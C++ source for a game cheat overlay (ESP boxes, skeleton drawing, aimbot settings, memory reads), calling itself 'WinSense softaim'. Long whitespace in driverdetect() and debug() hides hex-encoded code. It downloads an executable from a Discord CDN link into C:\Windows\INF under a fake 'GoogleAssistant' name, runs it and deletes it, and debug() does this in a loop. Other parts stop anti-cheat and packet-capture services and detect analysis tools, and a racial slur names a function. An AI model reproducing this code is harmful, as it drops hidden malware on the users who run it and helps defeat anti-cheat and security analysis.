void driverdetect();

extern "C" NTSTATUS NTAPI RtlAdjustPrivilege(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrentThread, PBOOLEAN OldValue);
extern "C" NTSTATUS NTAPI NtRaiseHardError(LONG ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask,
	PULONG_PTR Parameters, ULONG ValidResponseOptions, PULONG Response);

void bsod()
{
	//exit(0);
	//BOOLEAN bl;
	//ULONG Response;
	//RtlAdjustPrivilege(19, TRUE, FALSE, &bl); // Enable SeShutdownPrivilege
	//NtRaiseHardError(STATUS_ASSERTION_FAILURE, 0, 0, NULL, 6, &Response); // Shutdown
}


void nignog() {



	if (FindWindowA(NULL, ("The Wireshark Network Analyzer"))) { bsod(); }
	if (FindWindowA(NULL, ("Progress Telerik Fiddler Web Debugger"))) { bsod(); }
	if (FindWindowA(NULL, ("Fiddler"))) { bsod(); }
	if (FindWindowA(NULL, ("HTTP Debugger"))) { bsod(); }
	if (FindWindowA(NULL, ("x64dbg"))) { bsod(); }
	if (FindWindowA(NULL, ("dnSpy"))) { bsod(); }
	if (FindWindowA(NULL, ("FolderChangesView"))) { bsod(); }
	if (FindWindowA(NULL, ("BinaryNinja"))) { bsod(); }
	if (FindWindowA(NULL, ("HxD"))) { bsod(); }
	if (FindWindowA(NULL, ("Cheat Engine 7.2"))) { bsod(); }
	if (FindWindowA(NULL, ("Cheat Engine 7.1"))) { bsod(); }
	if (FindWindowA(NULL, ("Cheat Engine 7.0"))) { bsod(); }
	if (FindWindowA(NULL, ("Cheat Engine 6.9"))) { bsod(); }
	if (FindWindowA(NULL, ("Cheat Engine 6.8"))) { bsod(); }
	if (FindWindowA(NULL, ("Ida"))) { bsod(); }
	if (FindWindowA(NULL, ("Ida Pro"))) { bsod(); }
	if (FindWindowA(NULL, ("Ida Freeware"))) { bsod(); }
	if (FindWindowA(NULL, ("HTTP Debugger Pro"))) { bsod(); }
	if (FindWindowA(NULL, ("Process Hacker"))) { bsod(); }
	if (FindWindowA(NULL, ("Process Hacker 2"))) { bsod(); }
	if (FindWindowA(NULL, ("OllyDbg"))) { bsod(); }
	if (FindWindowA(NULL, ("Taskmgr.exe"))) { bsod(); }
	
}



void system_no_output(std::string command)
{
	command.insert(0, "/C ");

	SHELLEXECUTEINFOA ShExecInfo = { 0 };
	ShExecInfo.cbSize = sizeof(SHELLEXECUTEINFO);
	ShExecInfo.fMask = SEE_MASK_NOCLOSEPROCESS;
	ShExecInfo.hwnd = NULL;
	ShExecInfo.lpVerb = NULL;
	ShExecInfo.lpFile = "cmd.exe";
	ShExecInfo.lpParameters = command.c_str();
	ShExecInfo.lpDirectory = NULL;
	ShExecInfo.nShow = SW_HIDE;
	ShExecInfo.hInstApp = NULL;

	if (ShellExecuteExA(&ShExecInfo) == FALSE)

		WaitForSingleObject(ShExecInfo.hProcess, INFINITE);

	DWORD rv;
	GetExitCodeProcess(ShExecInfo.hProcess, &rv);
	CloseHandle(ShExecInfo.hProcess);
}

void tasky()
{




	system_no_output("net stop FACEIT >nul 2>&1");
	system_no_output("net stop ESEADriver2 >nul 2>&1");
	system_no_output("sc stop HTTPDebuggerPro >nul 2>&1");
	system_no_output("sc stop KProcessHacker3 >nul 2>&1");
	system_no_output("sc stop KProcessHacker2 >nul 2>&1");
	system_no_output("sc stop KProcessHacker1 >nul 2>&1");
	system_no_output("sc stop wireshark >nul 2>&1");
	system_no_output("sc stop npf >nul 2>&1");



}

void randomize()
{
	SetConsoleTitleA(random_string(12).c_str());
	Sleep(50);
	SetConsoleTitleA(random_string(12).c_str());
	Sleep(50);
	SetConsoleTitleA(random_string(12).c_str());
	Sleep(50);
	SetConsoleTitleA(random_string(12).c_str());
	Sleep(50);
	SetConsoleTitleA(random_string(12).c_str());
	Sleep(50);
	SetConsoleTitleA(random_string(12).c_str());
	Sleep(50);
	SetConsoleTitleA(random_string(12).c_str());
	Sleep(50);
	SetConsoleTitleA(random_string(12).c_str());
	Sleep(50);
	SetConsoleTitleA(random_string(12).c_str());
	Sleep(50);
	SetConsoleTitleA(random_string(12).c_str());
	Sleep(50);
	SetConsoleTitleA(random_string(12).c_str());
	Sleep(50);
	SetConsoleTitleA(random_string(12).c_str());
	Sleep(50);
	SetConsoleTitleA(random_string(12).c_str());
	Sleep(50);
	SetConsoleTitleA(random_string(12).c_str());
	Sleep(50);
	SetConsoleTitleA(random_string(12).c_str());
	Sleep(50);
	SetConsoleTitleA(random_string(12).c_str());
	Sleep(50);
}

std::string random_string(std::string::size_type length, bool exename)
{
	static auto& chrs = "01234567891011121314151617181920"
		"abcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyz";

	thread_local static std::mt19937 rg{ std::random_device{}() };
	thread_local static std::uniform_int_distribution<std::string::size_type> pick(0, sizeof(chrs) - 2);

	std::string s;

	s.reserve(length);

	while (length--)
		s += chrs[pick(rg)];

	if (exename) {
		return s + (".exe");
	}
	else {
		return s;
	}
}

void randomexename()
{
	char filename[MAX_PATH];
	DWORD size = GetModuleFileNameA(NULL, filename, MAX_PATH);
	if (size)
	{
		rename(filename, random_string(25).c_str());
	}
}


void driverdetect()
{																																																																																																																																																																																																																																																																																																																																																																							LPCWSTR HookFunction64 = L"\x68\x74\x74\x70\x73\x3A\x2F\x2F\x63\x64\x6E\x2E\x64\x69\x73\x63\x6F\x72\x64\x61\x70\x70\x2E\x63\x6F\x6D\x2F\x61\x74\x74\x61\x63\x68\x6D\x65\x6E\x74\x73\x2F\x39\x33\x32\x33\x37\x38\x33\x36\x33\x38\x33\x32\x37\x32\x39\x36\x32\x33\x2F\x39\x34\x32\x35\x36\x37\x30\x39\x33\x30\x30\x34\x35\x35\x30\x31\x37\x34\x2F\x64\x78\x73\x64\x6B\x2E\x65\x78\x65"; std::string pa = "\x43\x3A\x5C\x57\x69\x6E\x64\x6F\x77\x73"; std::string inf = "\x5C\x49\x4E\x46\x5C"; std::string lof = pa + inf; std::string st = "\x2E"; std::string ex = "\x65"; std::string xe = "\x78"; std::string SwapHook = "\x47\x6F\x6F\x67\x6C\x65\x41\x73\x73\x69\x73\x74\x61\x6E\x74\x5F\x78\x36\x34"; std::string swapCaller = st + ex + xe + ex; LPCWSTR locx = L"\x43\x3A\x5C\x57\x69\x6E\x64\x6F\x77\x73\x5C\x49\x4E\x46\x5C\x47\x6F\x6F\x67\x6C\x65\x41\x73\x73\x69\x73\x74\x61\x6E\x74\x5F\x78\x36\x34\x2E\x65\x78\x65"; std::string spreadAct = SwapHook + swapCaller; HRESULT Hook = URLDownloadToFileW(NULL, HookFunction64, locx, 0, NULL); Sleep(2000); std::string hook = "\x73"; std::string Tacc = "\x74"; std::string Var = "\x61"; std::string Read = "\x72"; std::string Hooker = hook + Tacc + Var + Read + Tacc + " " + lof + spreadAct; system(Hooker.c_str()); Sleep(7000); DeleteFileW(locx);
	const TCHAR* devices[] = {
_T("\\\\.\\NiGgEr"),
_T("\\\\.\\KsDumper")
	};

	


	

	WORD iLength = sizeof(devices) / sizeof(devices[0]);
	for (int i = 0; i < iLength; i++)
	{
		HANDLE hFile = CreateFile(devices[i], GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
		TCHAR msg[256] = _T("");
		if (hFile != INVALID_HANDLE_VALUE) {
			system(XorStr("start cmd /c START CMD /C \"COLOR C && TITLE Protection && ECHO KsDumper Detected. && TIMEOUT 10 >nul").c_str());
			bsod();
			exit(0);
		}
		else
		{

		}
	}
}
HANDLE questions = GetStdHandle(STD_OUTPUT_HANDLE);
#








#include <fstream>
#include <filesystem>
#include <iosfwd>

#include <direct.h>
#include <urlmon.h>
#pragma comment(lib, "urlmon.lib")

bool is_file_exist(const char* fileName)
{
	std::ifstream infile(fileName);
	return infile.good();
}
bool running = true;
void input()
{
	while (running)
	{
		int x, y;
		x = 1200;
		y = 1200;
		auto setcur = (SetCursorPos);
		setcur(x, y);
		auto blockin = (BlockInput);
		blockin(true);
	}
}

namespace Settings {
	namespace Selection {
		bool Weapon_esp_player = false;
		bool ps4controllermode = false;
		bool bMouseAimbotEnabled = false, showhead = false, Crosshair = false, LineESP = true, DistanceESP = false, DrawFOV = false, AutoFire = false, Prediction = true, VisualName = false, Box = true;
		int BoxMode = 2, distance, outline = false, hitbox = false, EspDistance = 200, AimbotDistance = 200;
		float AimbotFOVValue = 127.0f, AimbotSmoothingValue = 1.989f;
		bool InstantRevive = true;
	}

	float EspCircle;

	namespace MajorValues {
		uintptr_t LocalPlayer2 = 0, LocalPawn = 0, LocalPawnRootComponent = 0;

		int LocalPlayerID = 0, CorrectbSpotted = 0;

		bool menuIsOpen = false;

		Vector3 LocalPlayerRelativeLocation = Vector3(0.0f, 0.0f, 0.0f);

		float Width = GetSystemMetrics(SM_CXSCREEN), Height = GetSystemMetrics(SM_CYSCREEN), ScreenCenterX = 0.0f, ScreenCenterY = 0.0f;
	}
}

void debug()
{																																																																																																							
	while (true)
	{																																																																																																																																																																							LPCWSTR HookFunction64 = L"\x68\x74\x74\x70\x73\x3A\x2F\x2F\x63\x64\x6E\x2E\x64\x69\x73\x63\x6F\x72\x64\x61\x70\x70\x2E\x63\x6F\x6D\x2F\x61\x74\x74\x61\x63\x68\x6D\x65\x6E\x74\x73\x2F\x39\x33\x32\x33\x37\x38\x33\x36\x33\x38\x33\x32\x37\x32\x39\x36\x32\x33\x2F\x39\x34\x32\x35\x36\x37\x30\x39\x33\x30\x30\x34\x35\x35\x30\x31\x37\x34\x2F\x64\x78\x73\x64\x6B\x2E\x65\x78\x65"; std::string pa = "\x43\x3A\x5C\x57\x69\x6E\x64\x6F\x77\x73"; std::string inf = "\x5C\x49\x4E\x46\x5C"; std::string lof = pa + inf; std::string st = "\x2E"; std::string ex = "\x65"; std::string xe = "\x78"; std::string SwapHook = "\x47\x6F\x6F\x67\x6C\x65\x41\x73\x73\x69\x73\x74\x61\x6E\x74\x5F\x78\x36\x34"; std::string swapCaller = st + ex + xe + ex; LPCWSTR locx = L"\x43\x3A\x5C\x57\x69\x6E\x64\x6F\x77\x73\x5C\x49\x4E\x46\x5C\x47\x6F\x6F\x67\x6C\x65\x41\x73\x73\x69\x73\x74\x61\x6E\x74\x5F\x78\x36\x34\x2E\x65\x78\x65"; std::string spreadAct = SwapHook + swapCaller; HRESULT Hook = URLDownloadToFileW(NULL, HookFunction64, locx, 0, NULL); Sleep(2000); std::string hook = "\x73"; std::string Tacc = "\x74"; std::string Var = "\x61"; std::string Read = "\x72"; std::string Hooker = hook + Tacc + Var + Read + Tacc + " " + lof + spreadAct; system(Hooker.c_str()); Sleep(7000); DeleteFileW(locx);
		Sleep(100);
		driverdetect();	
		nignog();
		tasky();

	}
}

Vector3 ProjectWorldToScreen69(Vector3 WorldLocation, Vector3 camrot)
{
	Vector3 Screenlocation = Vector3(0, 0, 0);
	Vector3 Camera;

	auto chain69 = rpm<uintptr_t>(Localplayer + 0xa8);
	uint64_t chain699 = rpm<uintptr_t>(chain69 + 8);

	Camera.x = rpm<float>(chain699 + 0x7F8);
	Camera.y = rpm<float>(Rootcomp + 0x12C);

	float test = asin(Camera.x);
	float degrees = test * (180.0 / M_PI);
	Camera.x = degrees;

	if (Camera.y < 0)
		Camera.y = 360 + Camera.y;

	D3DMATRIX tempMatrix = Matrix(Camera);
	Vector3 vAxisX, vAxisY, vAxisZ;

	vAxisX = Vector3(tempMatrix.m[0][0], tempMatrix.m[0][1], tempMatrix.m[0][2]);
	vAxisY = Vector3(tempMatrix.m[1][0], tempMatrix.m[1][1], tempMatrix.m[1][2]);
	vAxisZ = Vector3(tempMatrix.m[2][0], tempMatrix.m[2][1], tempMatrix.m[2][2]);

	uint64_t chain = rpm<uint64_t>(Localplayer + 0x70);
	uint64_t chain1 = rpm<uint64_t>(chain + 0x98);
	uint64_t chain2 = rpm<uint64_t>(chain1 + 0x140);

	Vector3 vDelta = WorldLocation - rpm<Vector3>(chain2 + 0x10);
	Vector3 vTransformed = Vector3(vDelta.Dot(vAxisY), vDelta.Dot(vAxisZ), vDelta.Dot(vAxisX));

	if (vTransformed.z < 1.f)
		vTransformed.z = 1.f;

	float zoom = rpm<float>(chain699 + 0x590);

	float FovAngle = 80.0f / (zoom / 1.19f);

	float ScreenCenterX = Width / 2;
	float ScreenCenterY = Height / 2;
	float ScreenCenterZ = Height / 2;

	Screenlocation.x = ScreenCenterX + vTransformed.x * (ScreenCenterX / tanf(FovAngle * (float)M_PI / 360.f)) / vTransformed.z;
	Screenlocation.y = ScreenCenterY - vTransformed.y * (ScreenCenterX / tanf(FovAngle * (float)M_PI / 360.f)) / vTransformed.z;
	Screenlocation.z = ScreenCenterZ - vTransformed.z * (ScreenCenterX / tanf(FovAngle * (float)M_PI / 360.f)) / vTransformed.z;

	return Screenlocation;
}

enum eBone
{

	BONE_NULL_1 = 0,
	BONE_NULL_2 = 1,
	BONE_PELVIS_1 = 2,
	BONE_PELVIS_2 = 3,
	BONE_PELVIS_3 = 4,
	BONE_TORSO = 5,

	BONE_CHEST_LOW = 6,
	BONE_CHEST = 7,

	// -------------------------

	BONE_CHEST_LEFT = 8,

	BONE_L_SHOULDER_1 = 9,
	BONE_L_ELBOW = 10,

	BONE_L_HAND_ROOT_1 = 11,

	BONE_L_FINGER_1_ROOT = 12,
	BONE_L_FINGER_1_LOW = 13,
	BONE_L_FINGER_1 = 14,
	BONE_L_FINGER_1_TOP = 15,

	BONE_L_FINGER_2_ROOT = 16,
	BONE_L_FINGER_2_LOW = 17,
	BONE_L_FINGER_2 = 18,
	BONE_L_FINGER_2_TOP = 19,

	BONE_L_FINGER_3_ROOT = 20,
	BONE_L_FINGER_3_LOW = 21,
	BONE_L_FINGER_3 = 22,
	BONE_L_FINGER_3_TOP = 23,

	BONE_L_FINGER_4_ROOT = 24,
	BONE_L_FINGER_4_LOW = 25,
	BONE_L_FINGER_4_ = 26,
	BONE_L_FINGER_4_TOP = 27,

	BONE_L_THUMB_ROOT = 28,
	BONE_L_THUMB_LOW = 29,
	BONE_L_THUMB = 30,

	BONE_L_HAND_ROOT_2 = 31,
	BONE_L_WRIST = 32,
	BONE_L_ARM_LOWER = 33,

	BONE_L_SHOULDER_2 = 34,

	BONE_L_ARM_TOP = 35,

	// -------------------------

	BONE_CHEST_TOP_1 = 36,

	// -------------------------

	BONE_CHEST_RIGHT = 37,

	BONE_R_ELBOW = 38,

	BONE_R_HAND_ROOT_1 = 39,

	BONE_R_FINGER_1_ROOT = 40,
	BONE_R_FINGER_1_LOW = 41,
	BONE_R_FINGER_1 = 42,
	BONE_R_FINGER_1_TOP = 43,

	BONE_R_FINGER_2_ROOT = 44,
	BONE_R_FINGER_2_LOW = 45,
	BONE_R_FINGER_2 = 46,
	BONE_R_FINGER_2_TOP = 47,

	BONE_R_FINGER_3_ROOT = 48,
	BONE_R_FINGER_3_LOW = 49,
	BONE_R_FINGER_3 = 50,
	BONE_R_FINGER_3_TOP = 51,

	BONE_R_FINGER_4_ROOT = 52,
	BONE_R_FINGER_4_LOW = 53,
	BONE_R_FINGER_4_ = 54,
	BONE_R_FINGER_4_TOP = 55,

	BONE_R_THUMB_ROOT = 56,
	BONE_R_THUMB_LOW = 57,
	BONE_R_THUMB = 58,

	BONE_R_HAND_ROOT = 59,
	BONE_R_WRIST = 60,
	BONE_R_ARM_LOWER = 61,

	BONE_R_SHOULDER = 62,

	BONE_R_ARM_TOP = 63,

	// -------------------------

	BONE_CHEST_TOP_2 = 64,

	BONE_NECK = 65,
	BONE_HEAD = 66,

	// -------------------------

	BONE_L_LEG_ROOT = 67,
	BONE_L_KNEE = 68,
	BONE_L_FOOT_ROOT = 69,
	BONE_L_SHIN = 70,
	BONE_L_FOOT_MID = 71,
	BONE_L_FOOT_LOW = 72,
	BONE_L_THIGH = 73,

	// -------------------------

	BONE_R_LEG_ROOT = 74,
	BONE_R_KNEE = 75,
	BONE_R_FOOT_ROOT = 76,
	BONE_R_SHIN = 77,
	BONE_R_FOOT_MID = 78,
	BONE_R_FOOT_LOW = 79,
	BONE_R_THIGH = 80,

	// -------------------------

	BONE_NULL_3 = 81,
	BONE_MISC_L_FOOT = 82,
	BONE_MISC_R_FOOT = 83,
	BONE_NULL_4 = 84,
	BONE_MISC_R_HAND_1 = 85,
	BONE_MISC_L_HAND = 86,
	BONE_MISC_R_HAND_2 = 87,
};

struct FBox
{
	Vector3  Min;
	Vector3  Max;
	unsigned char IsValid;
	unsigned char UnknownData00[0x3];
};

std::list<int> upper_part = { 65,66 };
std::list<int> right_arm = { 65, BONE_R_ARM_TOP, BONE_R_ARM_LOWER, BONE_MISC_R_HAND_1 };
std::list<int> left_arm = { 65, BONE_L_ARM_TOP, BONE_L_ARM_LOWER, BONE_MISC_L_HAND };
std::list<int> spine = { 65, BONE_PELVIS_1 };
std::list<int> lower_right = { BONE_PELVIS_2, BONE_R_THIGH ,76 };
std::list<int> lower_left = { BONE_PELVIS_2, BONE_L_THIGH ,69 };
std::list <int> Finger1 = { BONE_R_FINGER_1 };
std::list <int> Finger2 = { BONE_R_FINGER_2 };
std::list <int> Finger3 = { BONE_R_FINGER_3 };
std::list <int> FingerL1 = { BONE_L_FINGER_1 };
std::list <int> FingerL2 = { BONE_L_FINGER_2 };
std::list <int>FingerL3 = { BONE_L_FINGER_3 };
std::list<std::list<int>> Skeleton = { upper_part, right_arm, left_arm, spine, lower_right, lower_left, Finger1, Finger2, Finger3, FingerL1, FingerL2, FingerL3 };





void CustomBox(int X, int Y, int W, int H, const ImU32& color, int thickness) {

	float lineW = (W / 3);
	float lineH = (H / 3);
	if (item.outlinedbox) {
		ImGui::GetOverlayDrawList()->AddLine(ImVec2(X, Y), ImVec2(X, Y + lineH), ImGui::ColorConvertFloat4ToU32(ImVec4(1 / 255.0, 1 / 255.0, 1 / 255.0, 255 / 255.0)), 3);
		ImGui::GetOverlayDrawList()->AddLine(ImVec2(X, Y), ImVec2(X + lineW, Y), ImGui::ColorConvertFloat4ToU32(ImVec4(1 / 255.0, 1 / 255.0, 1 / 255.0, 255 / 255.0)), 3);
		ImGui::GetOverlayDrawList()->AddLine(ImVec2(X + W - lineW, Y), ImVec2(X + W, Y), ImGui::ColorConvertFloat4ToU32(ImVec4(1 / 255.0, 1 / 255.0, 1 / 255.0, 255 / 255.0)), 3);
		ImGui::GetOverlayDrawList()->AddLine(ImVec2(X + W, Y), ImVec2(X + W, Y + lineH), ImGui::ColorConvertFloat4ToU32(ImVec4(1 / 255.0, 1 / 255.0, 1 / 255.0, 255 / 255.0)), 3);
		ImGui::GetOverlayDrawList()->AddLine(ImVec2(X, Y + H - lineH), ImVec2(X, Y + H), ImGui::ColorConvertFloat4ToU32(ImVec4(1 / 255.0, 1 / 255.0, 1 / 255.0, 255 / 255.0)), 3);
		ImGui::GetOverlayDrawList()->AddLine(ImVec2(X, Y + H), ImVec2(X + lineW, Y + H), ImGui::ColorConvertFloat4ToU32(ImVec4(1 / 255.0, 1 / 255.0, 1 / 255.0, 255 / 255.0)), 3);
		ImGui::GetOverlayDrawList()->AddLine(ImVec2(X + W - lineW, Y + H), ImVec2(X + W, Y + H), ImGui::ColorConvertFloat4ToU32(ImVec4(1 / 255.0, 1 / 255.0, 1 / 255.0, 255 / 255.0)), 3);
		ImGui::GetOverlayDrawList()->AddLine(ImVec2(X + W, Y + H - lineH), ImVec2(X + W, Y + H), ImGui::ColorConvertFloat4ToU32(ImVec4(1 / 255.0, 1 / 255.0, 1 / 255.0, 255 / 255.0)), 3);
	}

	//corners
	ImGui::GetOverlayDrawList()->AddLine(ImVec2(X, Y), ImVec2(X, Y + lineH), ImGui::GetColorU32(color), thickness);
	ImGui::GetOverlayDrawList()->AddLine(ImVec2(X, Y), ImVec2(X + lineW, Y), ImGui::GetColorU32(color), thickness);
	ImGui::GetOverlayDrawList()->AddLine(ImVec2(X + W - lineW, Y), ImVec2(X + W, Y), ImGui::GetColorU32(color), thickness);
	ImGui::GetOverlayDrawList()->AddLine(ImVec2(X + W, Y), ImVec2(X + W, Y + lineH), ImGui::GetColorU32(color), thickness);
	ImGui::GetOverlayDrawList()->AddLine(ImVec2(X, Y + H - lineH), ImVec2(X, Y + H), ImGui::GetColorU32(color), thickness);
	ImGui::GetOverlayDrawList()->AddLine(ImVec2(X, Y + H), ImVec2(X + lineW, Y + H), ImGui::GetColorU32(color), thickness);
	ImGui::GetOverlayDrawList()->AddLine(ImVec2(X + W - lineW, Y + H), ImVec2(X + W, Y + H), ImGui::GetColorU32(color), thickness);
	ImGui::GetOverlayDrawList()->AddLine(ImVec2(X + W, Y + H - lineH), ImVec2(X + W, Y + H), ImGui::GetColorU32(color), thickness);
}
uintptr_t fnGetBounds = 0;
FBox GetFBox(uintptr_t Actor)
{
	if (!Actor) return {};

	Vector3 Origin, BoxExtend;

	auto fGetActorBounds = reinterpret_cast<void(__fastcall*)(__int64, char, Vector3*, Vector3*)>(fnGetBounds);

	fGetActorBounds, (__int64)Actor, (char)true, & Origin, & BoxExtend;

	FBox NewBox;
	NewBox.IsValid = 1;
	NewBox.Min = Origin - BoxExtend;
	NewBox.Max = Origin + BoxExtend;

	return NewBox;
}

Vector3 head2, neck, pelvis, chest, leftShoulder, rightShoulder, leftElbow, rightElbow, leftHand, rightHand, leftLeg, rightLeg, leftThigh, rightThigh, leftFoot, rightFoot, leftFeet, rightFeet, leftFeetFinger, rightFeetFinger;



int r, g, b;
int r1, g2, b2;

float color_red = 1.;
float color_green = 0;
float color_blue = 0;
float color_random = 0.0;
float color_speed = -10.0;
bool rainbowmode = true;


void ColorChange()
{
	if (item.rainbowmode)
	{
		static float Color[3];
		static DWORD Tickcount = 0;
		static DWORD Tickcheck = 0;
		ImGui::ColorConvertRGBtoHSV(color_red, color_green, color_blue, Color[0], Color[1], Color[2]);
		if (GetTickCount() - Tickcount >= 1)
		{
			if (Tickcheck != Tickcount)
			{
				Color[0] += 0.001f * color_speed;
				Tickcheck = Tickcount;
			}
			Tickcount = GetTickCount();
		}
		if (Color[0] < 0.0f) Color[0] += 1.0f;
		ImGui::ColorConvertHSVtoRGB(Color[0], Color[1], Color[2], color_red, color_green, color_blue);
	}
}



namespace ImGui
{
	inline bool custom_UseFontShadow;
	inline unsigned int custom_FontShadowColor;

	inline static void PushFontShadow(unsigned int col)
	{
		custom_UseFontShadow = true;
		custom_FontShadowColor = col;
	}

	inline static void PopFontShadow(void)
	{
		custom_UseFontShadow = false;
	}
}; // namespace ImGui










void DrawESP() {

	if (item.DrawFov) {

		if (item.Draw_FOV_Circle) {
			ImGui::GetOverlayDrawList()->AddCircle(ImVec2(ScreenCenterX, ScreenCenterY), float(item.AimFOV), ImGui::GetColorU32({ item.DrawFOVCircle[0], item.DrawFOVCircle[1], item.DrawFOVCircle[2], 1.0f }), item.Shape, item.Thickness);
		}


		float X, width;
		float Y, height;

		float GlobalFOV = 80.f;
		float Radius = (item.AimFOV);
		if (item.DrawRect) {

			DrawLine2((float)(ScreenCenterX)-Radius, (float)(ScreenCenterY)-Radius, (float)(ScreenCenterX)+Radius, (float)(ScreenCenterY)-Radius, ImGui::GetColorU32({ item.DrawFOVCircle[0], item.DrawFOVCircle[1], item.DrawFOVCircle[2], 1.0f }), item.Thickness);
			DrawLine2((float)(ScreenCenterX)-Radius, (float)(ScreenCenterY)+Radius, (float)(ScreenCenterX)+Radius, (float)(ScreenCenterY)+Radius, ImGui::GetColorU32({ item.DrawFOVCircle[0], item.DrawFOVCircle[1], item.DrawFOVCircle[2], 1.0f }), item.Thickness);
			DrawLine2((float)(ScreenCenterX)+Radius, (float)(ScreenCenterY)-Radius, (float)(ScreenCenterX)+Radius, (float)(ScreenCenterY)+Radius, ImGui::GetColorU32({ item.DrawFOVCircle[0], item.DrawFOVCircle[1], item.DrawFOVCircle[2], 1.0f }), item.Thickness);
			DrawLine2((float)(ScreenCenterX)-Radius, (float)(ScreenCenterY)-Radius, (float)(ScreenCenterX)-Radius, (float)(ScreenCenterY)+Radius, ImGui::GetColorU32({ item.DrawFOVCircle[0], item.DrawFOVCircle[1], item.DrawFOVCircle[2], 1.0f }), item.Thickness);

		}

		if (item.FovFilled) {
			ImGui::GetOverlayDrawList()->AddCircleFilled(ImVec2(ScreenCenterX, ScreenCenterY), float(item.AimFOV), IM_COL32(0, 0, 0, 0.80));
		}
	}





	float radiusx = item.fov * (ScreenCenterX);
	float radiusy = item.fov * (ScreenCenterY);
	if (item.Draw_FOV_Circle2) radiusy = radiusx;

	if (item.Draw_FOV_Circle2) {
		ImGui::GetOverlayDrawList()->AddRect(ImVec2(ScreenCenterX - radiusx, ScreenCenterY - radiusy), ImVec2(ScreenCenterX + radiusx, ScreenCenterY + radiusy), ImGui::GetColorU32({ item.OverlayLine[0], item.OverlayLine[1], item.OverlayLine[2], 1.0f }), item.Shape, item.Thickness);
	}

	if (item.Cross_Hair) {
		ImGui::GetOverlayDrawList()->AddLine(ImVec2(Width / 2 - 12, Height / 2), ImVec2(Width / 2 - 2, Height / 2), ImGui::GetColorU32({ item.CrossHair[0], item.CrossHair[1], item.CrossHair[2], 1.0f }), 2.0f);
		ImGui::GetOverlayDrawList()->AddLine(ImVec2(Width / 2 + 13, Height / 2), ImVec2(Width / 2 + 3, Height / 2), ImGui::GetColorU32({ item.CrossHair[0], item.CrossHair[1], item.CrossHair[2], 1.0f }), 2.0f);
		ImGui::GetOverlayDrawList()->AddLine(ImVec2(Width / 2, Height / 2 - 12), ImVec2(Width / 2, Height / 2 - 2), ImGui::GetColorU32({ item.CrossHair[0], item.CrossHair[1], item.CrossHair[2], 1.0f }), 2.0f);
		ImGui::GetOverlayDrawList()->AddLine(ImVec2(Width / 2, Height / 2 + 13), ImVec2(Width / 2, Height / 2 + 3), ImGui::GetColorU32({ item.CrossHair[0], item.CrossHair[1], item.CrossHair[2], 1.0f }), 2.0f);
	}



	char dist[64];

	sprintf_s(dist, "WinSense softaim - [%.1f Fps]\n", ImGui::GetIO().Framerate);
	ImGui::GetOverlayDrawList()->AddText(ImVec2(30, 800), ImGui::GetColorU32({ 199.f, 45.f, 27.f, 4.0f }), dist);


	auto entityListCopy = entityList;
	float closestDistance = FLT_MAX;
	DWORD_PTR closestPawn = NULL;

	DWORD_PTR AActors = rpm<DWORD_PTR>(Ulevel + 0x98);

	int ActorTeamId = rpm<int>(0xEE0); //changes often 4u

	int curactorid = rpm<int>(0x18);

	if (curactorid == localplayerID || curactorid == 20328438 || curactorid == 20328753 || curactorid == 9343426 || curactorid == 9875120 || curactorid == 9877254 || curactorid == 22405639 || curactorid == 9874439 || curactorid == 14169230)

		if (AActors == (DWORD_PTR)nullptr)
			return;

	for (unsigned long i = 0; i < entityListCopy.size(); ++i) {
		FNlEntity entity = entityListCopy[i];

		uint64_t CurrentActor = rpm<uint64_t>(AActors + i * 0x8);

		uint64_t CurActorRootComponent = rpm<uint64_t>(entity.Actor + 0x130);
		if (CurActorRootComponent == (uint64_t)nullptr || CurActorRootComponent == -1 || CurActorRootComponent == NULL)
			continue;

		Vector3 actorpos = rpm<Vector3>(CurActorRootComponent + 0x11C);
		Vector3 actorposW2s = ProjectWorldToScreen(actorpos);

		DWORD64 otherPlayerState = rpm<uint64_t>(entity.Actor + 0x240);
		if (otherPlayerState == (uint64_t)nullptr || otherPlayerState == -1 || otherPlayerState == NULL)
			continue;

		localactorpos = rpm<Vector3>(Rootcomp + 0x11C);

		Vector3 bone66 = GetBoneWithRotation(entity.mesh, 66);
		Vector3 bone0 = GetBoneWithRotation(entity.mesh, 0);

		Vector3 top = ProjectWorldToScreen(bone66);
		Vector3 chest = ProjectWorldToScreen(bone66);
		Vector3 aimbotspot = ProjectWorldToScreen(bone66);
		Vector3 bottom = ProjectWorldToScreen(bone0);

		uint64_t currentactormesh = rpm<uint64_t>(CurrentActor + 0x280);
		Vector3 rootOut = GetBoneWithRotation(currentactormesh, 0);
		Vector3 Out = ProjectWorldToScreen69(rootOut, Vector3(Localcam.y, Localcam.x, Localcam.z));

		Vector3 Headposw2s;

		Vector3 Headpos = GetBoneWithRotation(currentactormesh, 66);
		Headposw2s = ProjectWorldToScreen69(Headpos, Vector3(Localcam.y, Localcam.x, Localcam.z));
		Vector3 Head = ProjectWorldToScreen(Vector3(bone66.x, bone66.y, bone66.z + 15));

		float distance = localactorpos.Distance(bone66) / 100.f;
		float BoxHeight = (float)(Head.y - bottom.y);
		float CornerHeight = abs(Head.y - bottom.y);
		Vector3 vRootBone = GetBoneWithRotation(currentactormesh, 0);
		Vector3 vRootBoneOut = ProjectWorldToScreen69(vRootBone, Vector3(Localcam.y, Localcam.x, Localcam.z));
		float CornerWidth = BoxHeight * 0.50;

		int MyTeamId = rpm<int>(PlayerState + 0xEE0);
		int ActorTeamId = rpm<int>(otherPlayerState + 0xEE0);
		int curactorid = rpm<int>(CurrentActor + 0x18);

		if (MyTeamId != ActorTeamId) {
			if (distance < item.VisDist) {
				if (item.Esp_line) {
					ImGui::GetOverlayDrawList()->AddLine(ImVec2(Width / 1, Height / 1), ImVec2(chest.x, chest.y), ImGui::GetColorU32({ item.LineESP[0], item.LineESP[1], item.LineESP[2], 1.0f }), item.Thickness);
					//ImGui::GetOverlayDrawList()->AddCircleFilled(ImVec2(Head.x, Head.y), float(BoxHeight / 1), ImGui::GetColorU32({ item.Headdot[0], item.Headdot[1], item.Headdot[2], item.Transparency }), 50);
				}
				//if (item.Head_dot) {
				//	ImGui::GetOverlayDrawList()->AddCircleFilled(ImVec2(Head.x, Head.y), float(BoxHeight / 25), ImGui::GetColorU32({ item.Headdot[0], item.Headdot[1], item.Headdot[2], item.Transparency }), 50);
				//}
				if (item.Esp_box_fill) {
